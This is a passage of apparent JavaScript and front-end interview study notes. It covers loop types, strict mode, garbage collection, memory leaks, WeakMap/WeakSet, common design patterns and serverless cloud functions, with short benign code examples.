While arrow functions offer concise syntax and are useful in many cases, especially for inline functions and callbacks, their inability to bind their own `this`, lack of an `arguments` object, and unsuitability for object methods, prototype methods, and constructors limit their applicability in certain JavaScript programming scenarios.

## Difference between `for..in` and `for..of` loops in JavaScript. 

### For...in Loop:
- The `for..in` loop iterates over all enumerable properties of an object.
- It is generally used for objects, where the loop iterates over the property keys of the object.
- For arrays, it iterates over the index values (keys) of the array.

```ts
const arr: number[] = [10, 20, 30]; // Array should be defined as number[]
for (let i in arr) {
    console.log(i); // Output: 0, 1, 2 (indexes)
}

const str: string = 'abc';
for (let i in str) {
    console.log(i); // Output: 0, 1, 2 (indexes)
}

const obj = {name: 'aaa', age: 30};
for (let i in obj) {
    console.log(i); // Output: name, age (keys)
}
```

### For...of Loop:
- The `for..of` loop iterates over iterable objects such as Arrays, Strings, Maps, NodeLists, and more.
- It is used to iterate over the values in these collections.
- It cannot be used directly on objects since they are not iterable.

```ts
const arr: number[] = [10, 20, 30];
for (let i of arr) {
    console.log(i); // Output: 10, 20, 30 (values)
}

const str: string = 'abc';
for (let i of str) {
    console.log(i); // Output: a, b, c (characters)
}

function fn(){
    for (let arg of arguments) {
        console.log(arg);
    }
}

fn(100, 200, 'aaa'); // Output: 100, 200, 'aaa'

const s1 = new Set([10, 20, 30]);
for (let i of s1) {
    console.log(i); // Output: 10, 20, 30 (Set values)
}

const m1 = new Map([
    ['x', 100],
    ['y', 200],
    ['z', 300]
]);
for (let [key, value] of m1) {
    console.log([key, value]); // Output: ['x', 100], ['y', 200], ['z', 300]
}
```

### Key Differences:
1. **Usage**: `for..in` is used to iterate over the keys of an object, whereas `for..of` is used to iterate over values of iterable objects.
2. **Applicability**: `for..in` works well with objects but is not ideal for arrays since the order of iteration is not guaranteed. `for..of` is ideal for arrays and other iterable objects.
3. **Type of Iterated Elements**: `for..in` iterates over keys (property names), while `for..of` iterates over values.

### Sample Answer:
The `for..in` loop in JavaScript is used to iterate over enumerable properties of an object, such as the keys of an object or the indices of an array. In contrast, the `for..of` loop is designed to iterate over the values of iterable objects like arrays, strings, Sets, Maps, and generator objects. The key difference lies in what they iterate over: `for..in` goes over keys/indexes, and `for..of` goes over values. `for..in` is typically used for objects, while `for..of` is more suitable for arrays and other iterable collections.

## What is and when to use `for await...of`
he for await...of statement is a feature in JavaScript that allows you to loop over asynchronous iterables—objects that you can iterate over asynchronously, such as Promises.

### Code example:
```ts
async function processPromises() {
    function createPromise(val) {
        return new Promise((resolve) => {
            setTimeout(() => {
                resolve(val);
            }, 1000);
        });
    }

    const p1 = createPromise(100);
    const p2 = createPromise(200);
    const p3 = createPromise(300);
    const list = [p1, p2, p3];

    // Iterating over an array of Promises and logging each resolved value
    // effect is same as:
    // Promise.all(list).then(res => console.log(res))
    for await (let res of list) {
        console.log(res);
    }

    // Performing asynchronous operations in sequence
    const arr = [100, 200, 300];
    for (let num of arr) {
        const res = await createPromise(num); // Ensure this code is inside an async function
        console.log(res);
    }
}

processPromises();
```

The `for await...of` loop is a powerful feature for handling asynchronous operations in JavaScript, providing a more intuitive and cleaner way to process sequences of Promises compared to chaining or using `Promise.all()`. It's particularly useful in scenarios where you need to maintain the order of operations or when working with streams of asynchronous data.

## What are the Features of JavaScript's Strict Mode?

Strict mode in JavaScript is an option that enables a restricted variant of JavaScript, enhancing error detection and overall code quality. It's activated by adding `'use strict';` at the beginning of a script or function.

### Features of Strict Mode

1. **Variables Must Be Declared**: Strict mode requires all variables to be declared before use. Usage of undeclared variables will result in a reference error, preventing accidental global variable creation.

2. **No `with` Statement**: The `with` statement is prohibited as it complicates the scope chain, making code optimization and debugging more difficult.

3. **Eval Scope Limitation**: Code within `eval()` is executed in its own scope, ensuring that variables or functions within `eval()` do not affect the surrounding scope.

4. **Controlled `this` Keyword Behavior**: In non-method functions, `this` is `undefined` instead of defaulting to the global object, reducing the risk of unintended references to the global scope.

5. **No Duplicate Parameter Names**: Functions cannot have parameters with the same name, aiding in the prevention of coding mistakes.

6. **Immutable Non-Writable Properties**: Assignments to non-writable properties result in an error, ensuring data integrity.

7. **Protection Against Deleting Fixed Properties**: Attempts to delete undeletable properties (like `Object.prototype`) trigger an error.

8. **No Octal Literals and Syntax**: Octal literals and escape sequences are disallowed, avoiding confusion with string data.

In conclusion, strict mode in JavaScript helps in writing safer and cleaner code by turning silent errors into throw errors, enforcing variable declarations, clarifying function scope, and preventing common coding pitfalls. These features significantly contribute to the robustness and maintainability of JavaScript code.

## Garbage Collection in JavaScript

Garbage collection in JavaScript is an automated process that identifies and frees up memory that is no longer being used by the application. This process is vital for preventing memory leaks and ensuring efficient memory usage. JavaScript implements garbage collection primarily through the following methods:

1. **Reference Counting**: In this method, the garbage collector counts the number of references to a value. When the reference count drops to zero, indicating that no part of the program is using that value, it is considered garbage and eligible for collection. However, reference counting has a significant limitation with circular references, where two objects reference each other, leading to memory leaks as their reference count never reaches zero.

2. **Mark-and-Sweep Algorithm**: Modern JavaScript engines, such as V8 (Chrome, Node.js) and SpiderMonkey (Firefox), use the Mark-and-Sweep algorithm. This method involves marking "roots" (variables directly referenced by the code being run, plus global variables). The garbage collector then traverses from these roots and marks all reachable objects. Objects not marked as reachable are considered unreachable and eligible for garbage collection. This approach effectively resolves the issue of circular references found in reference counting.

### Related Topics: Memory Management in JavaScript
- Understanding memory management is crucial for JavaScript developers, particularly for performance optimization.
- Developers should be aware of how different data types and structures affect memory usage.
- Profiling memory usage using browser tools can provide insights into how an application allocates and releases memory.

## Closures and Memory Leaks in JavaScript

Closures in JavaScript are not inherent sources of memory leaks. They are essential features that allow functions to access and remember variables from their lexical scope, even after the outer function has executed. However, if closures retain references to extensive scopes or objects longer than needed, they can contribute to memory leaks. This typically occurs when a closure, no longer in use, is still referenced in the code, preventing the garbage collector from freeing the memory of the scope's variables. Developers can prevent such issues by carefully managing the lifecycle of closures and ensuring they are dereferenced when no longer needed. This is particularly important in scenarios with loops or large objects.

### Related Topics: Efficient Use of Closures
- Closures are powerful for creating private variables and encapsulating functionality.
- Proper closure management involves understanding scope and closure lifecycles.
- In large applications, mindful use of closures can significantly impact performance and memory efficiency.

## Detecting Memory Leaks in JavaScript and React

To detect memory leaks in JavaScript and React, tools like the Chrome Developer Tools are invaluable. The Performance tab in these tools allows developers to record memory usage while interacting with the application. Observing the heap usage over time helps identify potential memory leaks, indicated by a continuous increase in memory usage without drops after garbage collection cycles. Common scenarios leading to memory leaks in React include:

- Unmanaged event listeners
- Uncleared timers
- Misuse of external libraries
- Improper handling of state and props

Preventing memory leaks involves proactive resource management, such as removing event listeners and clearing timers when components unmount.

### Related Topics: Best Practices for Avoiding Memory Leaks
- Regularly profile your application using browser development tools to monitor memory usage.
- Understand and apply lifecycle methods in React to clean up resources.
- Avoid common pitfalls like closures over large data sets, unmanaged event listeners, and global variables.

## WeakMap and WeakSet in JavaScript

WeakMap and WeakSet in JavaScript are collections that store objects weakly, meaning their elements are not prevented from being garbage-collected. 

- **WeakMap**: Allows associating data with objects without preventing their garbage collection. This is useful for private data or caches that do not interfere with the lifecycle of the objects. Ideal for situations where you want to avoid creating memory leaks by inadvertently retaining references to objects.

- **WeakSet**: Enables tracking a group of objects for presence checks without affecting their garbage collection. This is useful for tracking which objects have undergone a specific process without creating memory leaks.

### Related Topics: Use Cases for WeakMap and WeakSet
- WeakMap and WeakSet are particularly useful in scenarios where memory efficiency is crucial.
- They are often used in managing caches, tracking object references, and keeping metadata about objects without affecting their lifecycle.
- Understanding when to use WeakMap and WeakSet can significantly optimize memory usage in complex applications.

## Traverse an Array: `for` vs. `forEach` Performance

### Performance Comparison
When it comes to traversing an array in JavaScript, both `for` loops and the `forEach` method are commonly used. Each has its own strengths in terms of performance and readability. The primary distinction in their performance is attributed to the inherent differences in their implementation.

1. **Function Calls**: A `for` loop directly accesses each element in the array without additional overhead. In contrast, `forEach` uses a callback function for each element, introducing slight overhead due to the creation of a new execution context for each iteration.
2. **Flexibility and Optimization**: `for` loops offer greater flexibility, allowing the use of `break`, `continue`, and modification of the iteration index. This can lead to more optimized solutions in certain scenarios.

### Readability and Maintenance
Despite the potential speed advantage of `for` loops, `forEach` is often preferred for its readability and maintenance benefits. It provides a more declarative approach to iterating over arrays, improving code clarity and reducing the likelihood of common errors associated with `for` loops, like incorrect index usage.

### Practical Implications
In modern JavaScript engines, the performance gap between `for` and `forEach` is generally minimal for most practical applications. Thus, the decision to use one over the other should also consider factors like code readability, complexity of operations within the loop, and specific application requirements.

### Conclusion
While `for` loops can be faster due to lower overhead and greater optimization potential, the `forEach` method often offers more readable and maintainable code. The choice between the two should balance the need for performance with the benefits of cleaner and more expressive code, tailored to the specific needs of the project.


# system.md

## Common Design Patterns in Front-End Development and Their Usage Scenarios

### Design Principles
The most important principle in design patterns is the **Open/Closed Principle**, which states that a system should be open for extension but closed for modification. This means you should be able to add new functionality without changing the existing code.

### Factory Pattern
The Factory pattern involves using a factory function to create instances, effectively hiding the `new` keyword to encapsulate the creation process. This pattern is useful for scenarios where the creation process is complex or when there needs to be some control over how instances are created. Examples include the jQuery `$` function and React's `createElement` function.

**Example**:
```typescript
class Foo {}

function factory() {
    return new Foo();
}

const f = factory();
```

### Singleton Pattern
The Singleton pattern ensures that a class has only one instance and provides a global point of access to it. This is particularly useful for cases where a single instance of a class should be used across the system, such as the store in Vuex and Redux or a globally unique dialog/modal. JavaScript makes implementing singletons straightforward because there's no need to worry about multithreading issues that might arise in languages like Java, where thread locking mechanisms might be necessary to prevent multiple instances from being created.

**Example**:
```typescript
class Singleton {
    private static instance: Singleton;
    private constructor() {}
    static getInstance() {
        if (!Singleton.instance) {
            Singleton.instance = new Singleton();
        }
        return Singleton.instance;
    }
    fn1() {}
    fn2() {}
}

const s = Singleton.getInstance();
s.fn1();
```

### Proxy Pattern
The Proxy pattern involves using a proxy layer that clients interact with instead of accessing the object directly. This allows for various operations, like monitoring or intercepting get and set operations, to be performed transparently. A practical example of this pattern is the implementation of Vue3's reactivity system using ES6's `Proxy`.

**Example**:
```typescript
const obj = new Proxy({}, {
    get(target, key) {
        console.log('get', key);
        return target[key];
    },
    set(target, key, value) {
        console.log('set', key, value);
        target[key] = value;
    }
});
obj.name = 'jack';
console.log(obj.name);
```

### Observer Pattern
The Observer pattern is widely used in front-end development. It involves a subject and observers, where the observers are notified and updated whenever the subject undergoes a change. A common example is attaching click event listeners to a button, where each listener acts as an observer to the button's click event.

**Example**:
```typescript
btn.addEventListener('click', () => {
    console.log('click');
});
```

### Publish-Subscribe Pattern
Similar to the Observer pattern, the Publish-Subscribe pattern provides a more decoupled way for components to communicate. Components can publish events to a specific event channel and subscribe to this channel to receive notifications. It's important to unsubscribe from events, especially in component lifecycle hooks, to prevent memory leaks.

**Example**:
```typescript
event.on('event-key', () => {
    console.log('event 1');
});
event.on('event-key', () => {
    console.log('event 2');
});
event.emit('event-key');

// Remember to unsubscribe
function fn1() {}
event.on('event-key', fn1);
event.off('event-key', fn1);
```

### Decorator Pattern
The Decorator pattern allows for behavior to be added to individual objects, either statically or dynamically, without affecting the behavior of other objects from the same class. This pattern is similar to Aspect-Oriented Programming (AOP) and is supported in ES and TypeScript through decorator syntax. It's particularly useful for adding features or functionalities to existing classes without modifying them.

**Example**:
```typescript
@testable
class MyTestableClass {
    // ...
}

function testable(target) {
    target.isTestable = true;
}

console.log(MyTestableClass.isTestable);
```
In the example above, `@testable` is a decorator that adds new functionality to `MyTestableClass`.

### What's the distinction between the Observer pattern and the Publish-Subscribe pattern?

### Observer Pattern
In the Observer pattern, the subject (the object being observed) and the observers (the objects that want to be notified of changes in the subject) have direct knowledge of each other. This means there is a direct relationship where the subject holds references to the observers and directly notifies them of any changes. This pattern allows for a straightforward and direct communication line but can lead to higher coupling between the subject and its observers.

#### Characteristics:
- **Direct Communication**: Observers are directly registered with the subject.
- **Coupling**: There is a higher degree of coupling, as the subject and observers are directly aware of each other.
- **Use Case**: Suitable for simpler scenarios where the subject's state change is of interest to specific observers directly related to the subject.

### Publish-Subscribe Pattern
The Publish-Subscribe pattern, on the other hand, introduces a middle layer known as the "event channel" or "message broker," which decouples the publishers (the sources of events) from the subscribers (the receivers of events). Publishers publish events to the event channel without knowing who the subscribers will be. Similarly, subscribers listen for events through the event channel without knowing who the publishers are. This level of indirection adds flexibility and reduces coupling between components, making the system more scalable and easier to extend.

#### Characteristics:
- **Indirect Communication**: The communication between publishers and subscribers is mediated by an event channel, without direct knowledge of each other.
- **Coupling**: There is lower coupling due to the presence of the event channel as an intermediary.
- **Use Case**: Ideal for more complex scenarios where the event source and event consumers need to remain decoupled for scalability and maintainability reasons.

In summary, the key difference lies in the relationship and communication method between the parties involved: the Observer pattern facilitates direct communication between the subject and its observers, resulting in tighter coupling, whereas the Publish-Subscribe pattern uses an event channel to mediate communication, leading to looser coupling and greater flexibility.

## Benefits of Using Cloud Functions like Google Cloud Compared to Traditional Front-end/Back-end Separation

Cloud functions, such as those provided by Google Cloud, offer several advantages over the traditional front-end/back-end separation architecture. These benefits stem from cloud functions' ability to operate in a serverless environment, which changes how applications are built, deployed, and scaled. Below, we detail these benefits:

### Cost Efficiency
- **Google Cloud Functions** operate on a pay-as-you-go model, where charges are incurred only when the code is executed. This is particularly beneficial for applications with fluctuating traffic, as it aligns operational costs directly with actual usage, avoiding the need to pay for idle resources.

### Simplified Management
- **Serverless Architecture**: With Google Cloud Functions, there's no need to manage servers. Google handles all the infrastructure management tasks, including maintenance, patching, and security. In contrast, traditional architectures, even when utilizing virtual or cloud servers, require developers or operations teams to manage server configuration and upkeep.

### Automatic Scaling
- **Adaptability to Traffic**: Google Cloud Functions automatically scale based on the number of requests. This ensures that during peak traffic periods, more resources are allocated to handle increased concurrent requests, and during low traffic times, resources are reduced to save costs. Traditional models often require manual intervention or additional automation tools for scaling.

### Rapid Iteration
- **Development Agility**: The serverless model enables developers to quickly create and deploy code without worrying about underlying infrastructure. This supports faster development cycles and rapid iteration, whereas traditional deployment models might involve complex configuration and deployment processes.

### Integration and Automation
- **Seamless Ecosystem Connectivity**: Google Cloud Functions can be easily integrated with other services and tools within the Google Cloud Platform (GCP), such as Google Cloud Pub/Sub and Google Cloud Storage. This facilitates the creation of end-to-end automated solutions, streamlining the development process and enhancing functionality.

### Event-Driven Architecture
- **Responsive Microservices**: Google Cloud Functions inherently support an event-driven architecture, directly responding to events from Google Cloud services, like file uploads to Google Cloud Storage or messages published to Google Cloud Pub/Sub. This model is ideal for building highly decoupled and responsive microservices, as it allows services to react immediately to changes and triggers within the ecosystem.
# temp.md

